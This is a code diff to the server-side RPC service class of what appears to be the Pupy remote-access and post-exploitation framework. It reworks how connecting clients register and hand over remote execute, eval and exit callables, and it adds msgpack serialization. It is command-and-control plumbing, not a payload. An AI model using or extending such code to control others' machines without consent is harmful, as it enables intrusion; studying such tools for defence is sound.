@@ -23,6 +23,7 @@ import logging
 import traceback
 import json
 import zlib
+import msgpack
 
 from pupylib.PupyCredentials import Credentials
 
@@ -32,48 +33,62 @@ class PupyService(rpyc.Service):
         self._local_cleanups = []
         self._singles = {}
 
-    def on_connect(self):
-        try:
-            # code that runs when a connection is created
-            # (to init the serivce, if needed)
-            self._conn._config.update(dict(
-                allow_safe_attrs = True,
-                allow_public_attrs = False,
-                allow_pickle = False,
-                allow_getattr = True,
-                allow_setattr = False,
-                allow_delattr = False,
-                import_custom_exceptions = False,
-                instantiate_custom_exceptions = False,
-                instantiate_oldstyle_exceptions = False,
-            ))
-            #self._conn._config["safe_attrs"].add("__iter__")
-            #self._conn._config["safe_attrs"].add("readline")
-            self.modules=None
+        self.modules = None
+        self.namespace = None
+        self.modules = None
+        self.builtin = self.builtins = None
+        self.register_remote_cleanup = None
+        self.unregister_remote_cleanup = None
+        self.obtain_call = None
+        self.exit = None
+        self.eval = None
+        self.execute = None
+        self.pupyimporter = None
+        self.infos = None
+        self.get_infos = None
 
-            #some aliases :
-            try:
-                self.namespace=self._conn.root.namespace
-            except Exception:
-                if logging.getLogger().getEffectiveLevel()==logging.DEBUG:
-                    raise
-                else:
-                    return
+    def exposed_on_connect(self):
+        self._conn._config.update(dict(
+            allow_safe_attrs = False,
+            allow_public_attrs = False,
+            allow_pickle = False,
+            allow_getattr = False,
+            allow_setattr = False,
+            allow_delattr = False,
+            import_custom_exceptions = False,
+            instantiate_custom_exceptions = False,
+            instantiate_oldstyle_exceptions = False,
+        ))
 
-            self.execute=self._conn.root.execute
-            self.register_remote_cleanup=self._conn.root.register_cleanup
-            self.unregister_remote_cleanup=self._conn.root.unregister_cleanup
-            self.exit=self._conn.root.exit
-            self.eval=self._conn.root.eval
-            self.get_infos=self._conn.root.get_infos
-            self.builtin=self.modules.__builtin__
-            self.builtins=self.modules.__builtin__
-            self.exposed_stdin=sys.stdin
-            self.exposed_stdout=sys.stdout
-            self.exposed_stderr=sys.stderr
-            self.pupy_srv.add_client(self)
-        except Exception as e:
-            logging.error(traceback.format_exc())
+        self.modules = None
+
+        self.exposed_stdin = sys.stdin
+        self.exposed_stdout = sys.stdout
+        self.exposed_stderr = sys.stderr
+
+    def exposed_initialize_v1(
+            self,
+            namespace, modules, builtin,
+            register_cleanup, unregister_cleanup,
+            obtain_call,
+            remote_exit, remote_eval, remote_execute,
+            pupyimporter,
+            infos
+       ):
+        self.namespace = namespace
+        self.modules = modules
+        self.builtin = self.builtins = builtin
+        self.register_remote_cleanup = rpyc.async(register_cleanup)
+        self.unregister_remote_cleanup = rpyc.async(unregister_cleanup)
+        self.obtain_call = obtain_call
+        self.exit = rpyc.timed(remote_exit, 1)
+        self.eval = remote_eval
+        self.execute = remote_execute
+        self.pupyimporter = pupyimporter
+        self.infos = msgpack.loads(infos)
+        self.get_infos = lambda: self.infos
+
+        self.pupy_srv.add_client(self)
 
     def register_local_cleanup(self, cleanup):
         self._local_cleanups.append(cleanup)
@@ -94,8 +109,57 @@ class PupyService(rpyc.Service):
         for cleanup in self._local_cleanups:
             cleanup()
 
+    # Compatibility call
     def exposed_set_modules(self, modules):
-        self.modules=modules
+        try:
+            self.modules = modules
+            self.builtin = modules.__builtin__
+            self.builtins = self.builtin
+
+            try:
+                self.namespace = self._conn.root.namespace
+            except Exception:
+                if logging.getLogger().getEffectiveLevel()==logging.DEBUG:
+                    raise
+                else:
+                    return
+
+            self.execute = self._conn.root.execute
+            try:
+                self.register_remote_cleanup = self._conn.root.register_cleanup
+            except:
+                self.register_remote_cleanup = None
+
+            if self.register_remote_cleanup:
+                try:
+                    self.unregister_remote_cleanup = self._conn.root.unregister_cleanup
+                except:
+                    self.unregister_remote_cleanup = None
+
+                try:
+                    self.obtain_call = self._conn.root.obtain_call
+                except:
+                    pass
+
+            self.exit = self._conn.root.exit
+            self.eval = self._conn.root.eval
+            self.get_infos = self._conn.root.get_infos
+
+            self.pupy_srv.add_client(self)
+
+        except Exception as e:
+            logging.error(traceback.format_exc())
+            try:
+                self._conn.close()
+            except:
+                pass
+
+    def exposed_msgpack_dumps(self, js, compressed=False):
+        data = msgpack.dumps(js)
+        if compressed:
+            data = zlib.compress(data)
+
+        return data
 
     def exposed_json_dumps(self, js, compressed=False):
         data = json.dumps(js)
